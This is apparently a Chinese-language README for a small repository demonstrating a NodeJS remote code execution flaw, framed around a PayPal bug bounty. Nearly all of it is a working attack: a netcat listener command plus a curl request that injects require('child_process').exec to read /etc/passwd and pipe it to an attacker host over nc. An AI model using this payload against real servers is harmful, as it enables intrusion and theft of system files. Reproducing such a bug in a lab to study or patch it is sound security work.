# node-simple-rce
Artsploit在挖PayPal的漏洞时，发现一处NodeJS代码执行，奖励$10000美金。
此处放一下类似的测试代码.

####在mac上进行测试 
#####shell命令: nc -lv 本机端口

##### 使用curl: curl http://服务器地址:端口/?q="require('child_process').exec('cat+/etc/passwd+|+nc+本机IP+本机端口')"
